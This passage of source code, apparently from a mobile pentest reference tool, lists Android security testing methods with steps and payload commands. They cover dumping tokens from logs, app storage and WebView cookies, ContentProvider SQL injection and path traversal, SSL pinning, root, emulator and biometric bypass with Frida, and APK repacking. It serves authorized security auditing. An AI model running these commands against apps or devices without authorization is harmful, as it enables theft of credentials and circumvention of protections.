        steps: [
          "Clear device logcat buffer: `adb logcat -c`.",
          "Stream live logs while exercising authentication and transaction features: `adb logcat | grep -iE 'token|password|auth|secret|bearer'`.",
          "Inspect clipboard contents to check if OTPs or passwords leak to other applications: `adb shell dumpsys clipboard`.",
        ],
        payloads: [
          "adb logcat | grep -iE 'password|token|api_key'",
          "adb shell dumpsys clipboard",
        ],
        tips: "On Android 13+, the OS automatically shows a visual clipboard overlay with content preview, making clipboard leaks more prominent.",
      },
    ];
  }

  // 3. ANDROID DATA STORAGE
  if (catId.includes("storage")) {
    return [
      {
        title: "Method 1: Internal Sandbox Data Audit (SharedPreferences & SQLite)",
        scenario: "Inspecting private app data directory for unencrypted session tokens, credentials, and PII.",
        tools: ["adb shell", "run-as", "sqlite3"],
        steps: [
          "Enter app private sandbox: `adb shell run-as <package>` or access `/data/data/<package>/` with root.",
          "Inspect SharedPreferences XML files: `cat shared_prefs/*.xml`.",
          "Dump SQLite database tables: `sqlite3 databases/<app>.db '.tables'` and `SELECT * FROM users;`.",
          "Verify that passwords, refresh tokens, and authentication cookies are encrypted at rest.",
        ],
        payloads: [
          "adb shell run-as <package> cat shared_prefs/*.xml",
          "adb shell run-as <package> sqlite3 databases/app.db '.dump'",
        ],
        tips: "If `run-as` returns 'package not debuggable', use a rooted device/emulator (like Genymotion or Android AVD with Google APIs system image) to access `/data/data/<package>/`.",
      },
      {
        title: "Method 2: WebView LocalStorage & Cookies Inspection",
        scenario: "Extracting persistent web session cookies and HTML5 localStorage from embedded WebViews.",
        tools: ["adb shell", "strings", "sqlite3"],
        steps: [
          "Examine WebView Cookies SQLite database: `adb shell run-as <package> sqlite3 app_webview/Default/Cookies \"SELECT host_key, name, value FROM cookies;\"`.",
          "Search LevelDB local storage for stored JWTs and sensitive localStorage entries: `adb shell run-as <package> strings 'app_webview/Default/Local Storage/leveldb/'*.log | grep -iE 'token|auth|key|secret'`.",
          "Verify whether WebViews properly flush cookies and local storage upon user logout.",
        ],
        payloads: [
          "adb shell run-as <package> strings 'app_webview/Default/Local Storage/leveldb/'*.log | grep -iE 'token|auth|key'",
          "adb shell run-as <package> sqlite3 app_webview/Default/Cookies 'SELECT host_key, name, value FROM cookies;'",
        ],
        tips: "LevelDB stores key-value pairs in SST/log files; strings extraction is the quickest way to pull auth tokens without native LevelDB bindings.",
      },
      {
        title: "Method 3: External Storage & Scoped Storage Audit",
        scenario: "Verifying the app does not store sensitive files on world-readable external/SD card storage.",
        tools: ["adb shell", "adb pull"],
        steps: [
          "Recursively list app files on external storage: `adb shell ls -laR /sdcard/Android/data/<package>/`.",
          "Pull external files for offline analysis: `adb pull /sdcard/Android/data/<package>/ ./external_dump/`.",
          "Check if cached PDFs, invoices, IDs, or images are accessible without app sandbox permissions.",
        ],
        payloads: [
          "adb shell ls -laR /sdcard/Android/data/<package>/",
          "adb pull /sdcard/Android/data/<package>/ ./external-data",
        ],
        tips: "Any file stored under `/sdcard/` without scoped storage protection can be read by other installed apps possessing storage permission.",
      },
      {
        title: "Method 4: App Backup & Screenshot Exposure Testing",
        scenario: "Testing backup extraction and checking FLAG_SECURE window protection on sensitive screens.",
        tools: ["adb backup", "dd", "screencap"],
        steps: [
          "Trigger backup extraction: `adb backup -f backup.ab -noapk <package>`.",
          "Unpack backup archive with zlib decompression to check for unencrypted application state.",
          "Verify if `FLAG_SECURE` is applied by taking a screenshot of sensitive views: `adb shell screencap -p /sdcard/recents.png`.",
        ],
        payloads: [
          "adb backup -f backup.ab -noapk <package>",
          "dd if=backup.ab bs=24 skip=1 | python3 -c \"import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" > backup.tar",
          "adb shell screencap -p /sdcard/screenshot.png",
        ],
        tips: "Ensure `FLAG_SECURE` is enabled on screens rendering account balances, card details, or authentication credentials.",
      },
    ];
  }

  // 4. ANDROID CRYPTOGRAPHY
  if (catId.includes("crypto")) {
    return [
      {
        title: "Method 1: Android Keystore & Hardware Security Module Audit",
        scenario: "Verifying cryptographic keys reside in hardware-backed AndroidKeystore rather than software files.",
        tools: ["jadx-gui", "objection", "frida"],
        steps: [
          "Check code for `KeyStore.getInstance(\"AndroidKeyStore\")` and `KeyGenParameterSpec.Builder`.",
          "Ensure keys are configured with biometric/auth requirements: `setUserAuthenticationRequired(true)`.",
          "Verify no hardcoded encryption keys, AES IVs, or salts exist in bytecode or resource files.",
        ],
        payloads: [
          "grep -rn \"KeyGenParameterSpec\\|AndroidKeyStore\" out_src/",
          "objection -g <package> explore --startup-command 'android keystore list'",
        ],
        tips: "Hardware-backed keys generated inside StrongBox or TEE cannot be extracted even on fully rooted devices.",
      },
      {
        title: "Method 2: Dynamic Cipher Tracing & Weak Primitives Inspection",
        scenario: "Hooking cipher operations to detect ECB mode, static IV reuse, or weak hashing algorithms (MD5/SHA1).",
        tools: ["frida-trace", "jadx"],
        steps: [
          "Trace cipher initialization and execution: `frida-trace -U -f <package> -j 'javax.crypto.Cipher.init' -j 'javax.crypto.Cipher.doFinal'`.",
          "Inspect logged IV parameters across multiple encryption calls to ensure fresh randomness via `SecureRandom`.",
          "Search decompiled code for `AES/ECB` or `DES` cipher algorithms and replace with authenticated `AES/GCM`.",
        ],
        payloads: [
          "frida-trace -U -f <package> -j 'javax.crypto.Cipher.init' -j 'javax.crypto.spec.IvParameterSpec.*'",
          "grep -rnE \"MessageDigest.getInstance\\(\\\"(MD5|SHA-1)\\\"\\)|Cipher.getInstance\\(\\\"(DES|AES/ECB)\" out_src/",
        ],
        tips: "AES in ECB mode does not use an IV and leaks data patterns, while CBC mode with static IV allows chosen-ciphertext attacks.",
      },
      {
        title: "Method 3: Randomness & Token Generation Audit",
        scenario: "Checking PRNG predictability for security tokens and session identifiers.",
        tools: ["jadx-gui", "frida-trace"],
        steps: [
          "Search code for `java.util.Random` usage in security-sensitive contexts instead of `java.security.SecureRandom`.",
          "Trace random number generation to detect static seeds or predictable sequence patterns.",
        ],
        payloads: [
          "grep -rn \"new Random(\\|java.util.Random\" out_src/",
          "frida-trace -U -f <package> -j 'java.util.Random.*'",
        ],
        tips: "`java.util.Random` is a linear congruential generator (LCG) whose future outputs can be predicted after observing a few outputs.",
      },
      {
        title: "Method 4: Padding Oracle & Custom Cipher Tampering",
        scenario: "Tampering with encrypted ciphertexts to detect padding oracle timing leaks or error side-channels.",
        tools: ["padbuster", "python3"],
        steps: [
          "If custom CBC padding is used, flip bits in ciphertext blocks to observe decryption behavior.",
          "Check if server/app distinguishes between padding errors and authentication/MAC errors.",
        ],
        payloads: [
          "python3 -c \"ct=bytearray.fromhex('...'); ct[-1]^=1; print(ct.hex())\"",
          "padbuster https://api.example.com/decrypt <encrypted_blob> 16 -encoding 0 -cookies 'session=...'",
        ],
        tips: "Modern implementations should always prefer Authenticated Encryption (AES-GCM or ChaCha20-Poly1305) over CBC+padding.",
      },
    ];
  }

  // 5. ANDROID NETWORK COMMUNICATION
  if (catId.includes("network")) {
    return [
      {
        title: "Method 1: Custom CA Installation & Burp Suite Proxying",
        scenario: "Intercepting HTTPS API traffic on Android 7+ (Nougat through Android 15).",
        tools: ["Burp Suite / Caido", "adb", "OpenSSL"],
        steps: [
          "Convert Burp certificate: `openssl x509 -inform DER -in cacert.der -out burp.pem`.",
          "Calculate hash: `HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)`.",
          "Push certificate to Android system trust store on rooted device: `adb push burp.pem /system/etc/security/cacerts/$HASH.0`.",
          "Set device HTTP proxy: `adb shell settings put global http_proxy <proxy_ip>:8080`.",
        ],
        payloads: [
          "adb shell settings put global http_proxy <burp_ip>:8080",
          "adb shell settings put global http_proxy :0  # disable proxy",
        ],
        tips: "On Android 14+, mounting `/system` as read-write requires Magisk modules like 'AlwaysTrustUserCerts' or specialized emulator images.",
      },
      {
        title: "Method 2: SSL/TLS Pinning Bypass via Frida & Objection",
        scenario: "Bypassing OkHttp CertificatePinner, TrustManager, and NetworkSecurityConfig certificate pinning.",
        tools: ["frida", "objection", "apk-mitm"],
        steps: [
          "Spawn target app with universal Frida pinning bypass script: `frida -U -f <package> -l ssl-pinning-bypass.js --no-pause`.",
          "Alternatively attach Objection: `objection -g <package> explore --startup-command 'android sslpinning disable'`.",
          "Verify in Burp Suite HTTP History that all backend requests are decrypted and displayed.",
        ],
        payloads: [
          "frida -U -f <package> -l ssl-pinning-bypass.js --no-pause",
          "objection -g <package> explore --startup-command 'android sslpinning disable'",
        ],
        tips: "If the app uses custom native C++ pinning (e.g. BoringSSL), standard Java hooks won't work — look into `reflutter` or native hooking.",
      },
      {
        title: "Method 3: Mobile Backend API Vulnerability Testing",
        scenario: "Applying API security testing (BOLA, IDOR, SQLi, Mass Assignment) to intercepted mobile endpoints.",
        tools: ["Burp Repeater", "ffuf", "Autorize"],
        steps: [
          "Send captured mobile requests to Burp Repeater for parameter manipulation.",
          "Test BOLA/IDOR by swapping account IDs, UUIDs, or mobile session tokens.",
          "Check if mobile API endpoints skip security controls (rate limiting, MFA, WAF) enforced on web counterparts.",
        ],
        payloads: [
          "burp suite -> right-click traffic -> Send to Repeater/Intruder",
          "ffuf -u https://api.example.com/v1/user/FUZZ -H 'Authorization: Bearer <token>' -w ids.txt",
        ],
        tips: "Mobile endpoints are frequently versioned (e.g. `/api/v1/mobile/`) and often have weaker authorization than main web apps.",
      },
      {
        title: "Method 4: Cleartext Traffic & Network Security Config Audit",
        scenario: "Checking network_security_config.xml and verifying no credentials leak over plain HTTP.",
        tools: ["apktool", "jadx", "mitmproxy"],
        steps: [
          "Inspect `res/xml/network_security_config.xml` for `cleartextTrafficPermitted=\"true\"`.",
          "Look for insecure custom `<trust-anchors>` allowing user-installed certificates without proper pinning.",
          "Monitor transparent traffic via mitmproxy to confirm all outbound calls enforce HTTPS.",
        ],
        payloads: [
          "grep -rn \"cleartextTrafficPermitted\" out_src/ res/",
          "mitmproxy --mode transparent -p 8080",
        ],
        tips: "Even if main APIs use HTTPS, check third-party analytics and ad trackers which often fallback to cleartext HTTP.",
      },
    ];
  }

  // 6. ANDROID IPC SECURITY
  if (catId.includes("ipc")) {
    return [
      {
        title: "Method 1: ContentProvider Query & SQL Injection Testing",
        scenario: "Interacting with exported ContentProviders to extract data or inject SQL payloads.",
        tools: ["adb shell content", "drozer"],
        steps: [
          "Query exported provider: `adb shell content query --uri content://<authority>/<table_name>`.",
          "Test SQL injection by injecting UNION SELECT into `--where` or `--sort`: `adb shell content query --uri content://<authority>/<table> --where \"1=1) UNION SELECT * FROM sqlite_master--\"`.",
          "Test path traversal in ContentProviders implementing file streams: `adb shell content read --uri content://<authority>/../../../../data/data/<package>/databases/<db>`.",
        ],
        payloads: [
          "adb shell content query --uri content://<provider>/table",
          "adb shell content query --uri content://<provider>/table --where \"1=1) UNION SELECT * FROM sqlite_master--\"",
        ],
        tips: "Exported ContentProviders with `grantUriPermissions=\"true\"` can be tricked into granting unauthorized read/write permissions.",
      },
      {
        title: "Method 2: Exported Service & Broadcast Receiver Injection",
        scenario: "Sending crafted intents to exported background services and broadcast receivers.",
        tools: ["adb shell am", "drozer"],
        steps: [
          "Directly start exported service: `adb shell am startservice -n <package>/<service>`.",
          "Broadcast crafted intents with extra arguments: `adb shell am broadcast -a <action> --es key value`.",
          "Check if service or receiver performs sensitive actions without verifying caller identity or signature.",
        ],
        payloads: [
          "adb shell am startservice -n <package>/<service>",
          "adb shell am broadcast -a <action> --es cmd 'test'",
        ],
        tips: "Services exported without permissions can be bound by any malicious app on the device to invoke sensitive RPC methods.",
      },
      {
        title: "Method 3: Intent Redirection & Confused Deputy Audit",
        scenario: "Exploiting exported activities that forward received Intent extras to private components.",
        tools: ["drozer", "jadx-gui", "adb"],
        steps: [
          "Analyze exported activities in JADX for calls like `getIntent().getParcelableExtra(...)` followed by `startActivity(...)`.",
          "Craft an Intent that routes through the exported activity to trigger a private/internal component.",
          "Verify if arbitrary internal activities can be reached from external apps.",
        ],
        payloads: [
          "adb shell am start -n <package>/<exported_activity> -e forward_intent 'component=<package>/.PrivateActivity'",
        ],
        tips: "Intent redirection is a high-bounty vulnerability because it lets external unprivileged apps launch internal administrative screens.",
      },
      {
        title: "Method 4: PendingIntent Mutability & Custom Permission Audit",
        scenario: "Auditing PendingIntents for missing FLAG_IMMUTABLE and checking custom permission protectionLevel.",
        tools: ["jadx-gui", "adb shell dumpsys"],
        steps: [
          "Check if `PendingIntent.getActivity` or `getBroadcast` omits `FLAG_IMMUTABLE`.",
          "Check custom permissions: verify if declared permissions use `protectionLevel=\"normal\"` instead of `\"signature\"`.",
        ],
        payloads: [
          "grep -rn \"PendingIntent.getActivity\\|PendingIntent.getBroadcast\" out_src/ | grep -v FLAG_IMMUTABLE",
          "adb shell dumpsys package <package> | grep -A5 'declared permissions'",
        ],
        tips: "On Android 12+, mutable PendingIntents without explicit flags cause runtime crashes; if `FLAG_MUTABLE` is forced insecurely, intent fields can be overwritten.",
      },
    ];
  }

  // 7. ANDROID REVERSE ENGINEERING PROTECTION
  if (catId.includes("reverse")) {
    return [
      {
        title: "Method 1: Root & Frida Detection Analysis & Bypass",
        scenario: "Analyzing anti-tampering and bypassing root/Frida detection checks.",
        tools: ["frida", "objection", "RootBeer"],
        steps: [
          "Search source code for common root indicators (`su` binary, `test-keys`, Magisk, RootBeer library).",
          "Run Objection root bypass: `objection -g <package> explore --startup-command 'android root disable'`.",
          "Use Frida to hook and neutralize anti-Frida detection threads (`gum-js-loop`, named pipes).",
        ],
        payloads: [
          "objection -g <package> explore --startup-command 'android root disable'",
          "frida -U -f <package> -l anti-frida-detection-bypass.js --no-pause",
        ],
        tips: "Effective root detection requires multi-layered checks; single-function checks are trivial to bypass with Frida.",
      },
      {
        title: "Method 2: APK Repacking, Smali Patching & Re-signing",
        scenario: "Modifying smali instructions directly to bypass client-side checks and re-signing the APK.",
        tools: ["apktool", "keytool", "apksigner"],
        steps: [
          "Decompile to smali: `apktool d app.apk -o repack`.",
          "Edit smali files: flip conditional branches (e.g. change `if-eqz v0, :cond_0` to `if-nez` or `goto :cond_0`).",
          "Rebuild APK: `apktool b repack -o modified.apk`.",
          "Sign with debug key: `apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android modified.apk`.",
          "Install and test if the modified APK runs and bypasses the check.",
        ],
        payloads: [
          "apktool d app.apk -o modified && apktool b modified -o repacked.apk",
          "apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android repacked.apk",
        ],
        tips: "Check whether the app verifies its own signing certificate fingerprint (`PackageManager.GET_SIGNING_CERTIFICATES`) at runtime.",
      },
      {
        title: "Method 3: Native Library (.so) Static & Dynamic Analysis",
        scenario: "Reversing compiled C/C++ native libraries located in `lib/arm64-v8a/`.",
        tools: ["Ghidra", "radare2", "objdump", "strings"],
        steps: [
          "Extract native libraries from APK and run strings: `strings lib/arm64-v8a/libnative.so | grep -iE 'key|secret|token|http'`.",
          "Load `.so` file into Ghidra or radare2 to decompile JNI functions (`Java_com_...`).",
          "Identify cryptographic routines, secret keys, or custom tampering checks implemented in native code.",
        ],
        payloads: [
          "strings lib/arm64-v8a/libnative.so | grep -i key",
          "objdump -d lib/arm64-v8a/libnative.so | less",
        ],
        tips: "Many apps place sensitive logic in C/C++ native libraries assuming it cannot be decompiled; Ghidra reconstructs C code cleanly.",
      },
      {
        title: "Method 4: Emulator Detection Bypass",
        scenario: "Bypassing hardware fingerprinting and QEMU property checks to run on test emulators.",
        tools: ["frida", "jadx-gui"],
        steps: [
          "Grep code for `Build.FINGERPRINT`, `Build.HARDWARE`, `ro.kernel.qemu`, and goldfish drivers.",
          "Hook `android.os.SystemProperties.get` with Frida to return genuine physical device properties.",
        ],
        payloads: [
          "grep -rn \"Build.FINGERPRINT.*generic\\|goldfish\\|ro.kernel.qemu\" out_src/",
          "frida -U -f <package> -l emulator-bypass.js --no-pause",
        ],
        tips: "Combine Frida hooks with MagiskHide or shamiko on physical rooted devices for the cleanest bypass environment.",
      },
    ];
  }

  // 8. ANDROID FLUTTER & REACT NATIVE HYBRID
  if (catId.includes("hybrid") || catId.includes("flutter") || catId.includes("react")) {
    return [
      {
        title: "Method 1: Flutter Dart AOT Snapshot Decompilation (blutter)",
        scenario: "Reconstructing Dart classes, method offsets, and string pools from libapp.so.",
        tools: ["blutter", "radare2"],
        steps: [
          "Extract `libapp.so` and `libflutter.so` from APK directory `lib/arm64-v8a/`.",
          "Run blutter: `python3 blutter.py /path/to/lib/arm64-v8a/ out_dir/`.",
          "Inspect reconstructed Dart code for hardcoded secrets, hidden API endpoints, and business logic.",
        ],
        payloads: [
          "python3 blutter.py /path/to/lib/arm64-v8a/ out_dir/",
        ],
        tips: "Blutter requires the target Flutter version's engine symbols to decompile Dart snapshots cleanly.",
      },
      {
        title: "Method 2: Flutter SSL Pinning Bypass via reFlutter",
        scenario: "Patching Flutter engine's BoringSSL verification to enable Burp Suite proxying.",
        tools: ["reflutter", "apktool", "apksigner"],
        steps: [
          "Execute reFlutter on target APK: `reflutter app.apk`.",
          "Input proxy IP and port when prompted.",
          "Re-sign the patched `release.RE.apk` using `apksigner`.",
          "Install and capture Flutter HTTPS traffic in Burp Suite.",
        ],
        payloads: [
          "reflutter app.apk",
          "apksigner sign --ks ~/.android/debug.keystore release.RE.apk",
        ],
        tips: "Flutter does not use the Android system proxy or CA store; reFlutter patches the engine binary directly.",
      },
      {
        title: "Method 3: React Native Hermes Bytecode Extraction & Disassembly",
        scenario: "Extracting and disassembling Hermes compiled JavaScript bytecode (`index.android.bundle`).",
        tools: ["hbctool", "hermes-dec", "strings"],
        steps: [
          "Extract `assets/index.android.bundle` from APK.",
          "Disassemble Hermes bytecode: `hbctool disasm assets/index.android.bundle output_dir`.",
          "Search recovered JavaScript files for embedded API tokens, Firebase configs, and client-side logic.",
        ],
        payloads: [
          "hbctool disasm assets/index.android.bundle output_dir",
          "strings assets/index.android.bundle | grep -E '(api_key|secret|firebase|token)'",
        ],
        tips: "Modern React Native apps compile JS into Hermes bytecode (.hbc) by default for faster startup times.",
      },
      {
        title: "Method 4: React Native Bridge & JavaScript Interface Hooking",
        scenario: "Intercepting asynchronous JSON bridge messages between JS bundle and native Android code.",
        tools: ["frida", "objection"],
        steps: [
          "Hook React Native `com.facebook.react.bridge.CatalystInstanceImpl` to inspect call batches.",
          "Monitor native module invocations and arguments passed from JavaScript.",
        ],
        payloads: [
          "frida -U -f <package> -l react-native-bridge-hook.js --no-pause",
        ],
        tips: "Watch for sensitive parameters (passwords, tokens) passed across the React Native bridge in plaintext.",
      },
    ];
  }

  // 9. ANDROID MODERN BIOMETRICS & APP LINKS
  if (catId.includes("modern-auth") || catId.includes("bio") || catId.includes("applink")) {
    return [
      {
        title: "Method 1: BiometricPrompt Callback Hooking Bypass",
        scenario: "Hooking authentication callbacks to bypass biometric prompt when not backed by Keystore CryptoObject.",
        tools: ["frida", "objection"],
        steps: [
          "Analyze whether the app relies on client-side callback `onAuthenticationSucceeded` or enforces Keystore `CryptoObject`.",
          "Inject Frida hook to force biometric success: `frida -U -f <package> -l biometric-hook.js --no-pause`.",
          "Hook `BiometricPrompt.AuthenticationCallback.onAuthenticationSucceeded` and pass dummy `AuthenticationResult`.",
          "Verify if app unlocks sensitive data or requires a valid Keystore-decrypted token.",
        ],
        payloads: [
          "frida -U -f <package> -l biometric-hook.js --no-pause",
          "Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback').onAuthenticationSucceeded.implementation = function() { ... };",
        ],
        tips: "If the app relies on a Keystore-backed `CryptoObject`, forcing the callback alone will crash or fail decryption because the master key remains locked.",
      },
      {
        title: "Method 2: Android App Links & assetlinks.json Verification",
        scenario: "Checking digital asset links verification to prevent deep link hijacking and OAuth token theft.",
        tools: ["curl", "adb shell am"],
        steps: [
          "Fetch domain's Digital Asset Links: `curl -s https://<domain>/.well-known/assetlinks.json`.",
          "Confirm `package_name` and `sha256_cert_fingerprints` strictly match target APK signing cert.",
          "Test deep link intent handling via ADB: `adb shell am start -a android.intent.action.VIEW -d 'https://<domain>/reset?token=xyz' <package>`.",
        ],
        payloads: [
          "curl -s https://example.com/.well-known/assetlinks.json",
          "adb shell am start -a android.intent.action.VIEW -d 'https://example.com/reset?token=xyz' <package>",
        ],
        tips: "If autoVerify is missing or assetlinks.json returns 404 or bad fingerprint, an attacker app can intercept deep link URLs.",
      },
    ];
  }

  // Generic Android Fallback
  return [
    {
      title: "Method 1: Static Bytecode & Decompilation Analysis",
      scenario: "Decompiling and auditing APK resources, smali, and Java source code.",
      tools: ["jadx-gui", "apktool"],
      steps: [
        "Decompile APK with JADX: `jadx -d out_src app.apk`.",
        `Analyze guidance: ${item.how}`,
        basePayload ? `Verify pattern: ${basePayload}` : "Search codebase for related classes and methods.",
      ],
      payloads: basePayload ? [basePayload] : undefined,
      tips: "Always cross-reference decompiled Java with raw smali in APKTool output if code looks mangled by obfuscation.",
    },
    {
      title: "Method 2: Dynamic Instrumentation & Hooking with Frida",
      scenario: "Interacting with target app dynamically on a live device or emulator.",
      tools: ["Frida", "objection"],
      steps: [
        "Spawn app under Frida: `frida -U -f <package> -l hook.js --no-pause`.",
        "Hook related classes to inspect arguments, return values, and execution flow.",
      ],
      payloads: ["frida -U -f <package> -l hook.js --no-pause"],
      tips: "Use Objection for quick interactive method watching before writing full Frida scripts.",
    },
    {
      title: "Method 3: ADB Command-Line & Intent Verification",
      scenario: "Exercising components and checking system logs from the command line.",
      tools: ["adb shell", "logcat"],
      steps: [
        "Trigger relevant actions via ADB commands (`am start`, `am broadcast`, `content query`).",
        "Monitor logcat for sensitive leaks: `adb logcat | grep -iE 'token|secret|password'`.",
      ],
      tips: "ADB allows fast scripted reproduction for bug bounty triage reports.",
    },
    {
      title: "Method 4: Interception Proxy & Traffic Analysis",
      scenario: "Capturing and modifying network traffic sent between the mobile app and backend APIs.",
      tools: ["Burp Suite / Caido", "mitmproxy"],
      steps: [
        "Bypass certificate pinning to allow cleartext proxy inspection.",
        "Forward interesting requests to Burp Repeater to test for authorization and input validation flaws.",
      ],
      tips: "Verify if mobile endpoints enforce the same rate limits and authorization checks as web portals.",
    },
  ];
}

